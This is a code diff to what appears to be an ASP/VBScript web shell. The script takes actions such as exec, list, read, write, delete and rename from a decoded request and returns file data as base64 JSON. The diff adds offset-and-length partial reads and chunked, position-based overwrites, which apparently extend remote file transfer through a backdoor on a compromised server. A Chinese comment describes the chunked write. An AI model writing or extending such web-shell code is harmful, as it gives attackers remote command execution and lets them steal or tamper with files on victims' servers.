@@ -203,14 +203,21 @@ Function DoList(p)
   End If
   DoList = outv
 End Function
-Function DoRead(p)
+Function DoRead(p, o, l)
   On Error Resume Next
   Dim st, bytes
   Set st = CreateObject("ADODB.Stream")
   st.Type = 1
   st.Open
   st.LoadFromFile p
-  bytes = st.Read
+  If o <> "" And IsNumeric(o) Then
+    st.Position = CLng(o)
+  End If
+  If l <> "" And IsNumeric(l) Then
+    bytes = st.Read(CLng(l))
+  Else
+    bytes = st.Read
+  End If
   st.Close
   If Err.Number <> 0 Then
     DoRead = "{""ok"":false,""error"":""read failed""" 
@@ -218,15 +225,26 @@ Function DoRead(p)
   End If
   DoRead = "{""ok"":true,""data"":""" & B64Encode(bytes) & """}"
 End Function
-Function DoWrite(p, d)
+Function DoWrite(p, d, o)
   On Error Resume Next
   Dim arr, st
   arr = B64Decode(d)
   Set st = CreateObject("ADODB.Stream")
   st.Type = 1
   st.Open
-  st.Write arr
-  st.SaveToFile p, 2
+  If o <> "" And IsNumeric(o) And o > 0 Then
+    ' 分块写：加载现有文件，定位后覆盖
+    st.LoadFromFile p
+    st.Position = CLng(o)
+    st.Write arr
+    Dim fso
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    If fso.FileExists(p) Then fso.DeleteFile p, True
+    st.SaveToFile p, 2
+  Else
+    st.Write arr
+    st.SaveToFile p, 2
+  End If
   st.Close
   If Err.Number <> 0 Then
     DoWrite = "{""ok"":false,""error"":""write failed: " & EscJson(Err.Description) & """}"
@@ -298,9 +316,9 @@ ElseIf action = "exec" Then
 ElseIf action = "list" Then
   outv = DoList(GetVal(plain, "p"))
 ElseIf action = "read" Then
-  outv = DoRead(GetVal(plain, "p"))
+  outv = DoRead(GetVal(plain, "p"), GetVal(plain, "o"), GetVal(plain, "l"))
 ElseIf action = "write" Then
-  outv = DoWrite(GetVal(plain, "p"), GetVal(plain, "d"))
+  outv = DoWrite(GetVal(plain, "p"), GetVal(plain, "d"), GetVal(plain, "o"))
 ElseIf action = "delete" Then
   outv = DoDel(GetVal(plain, "p"))
 ElseIf action = "rename" Then
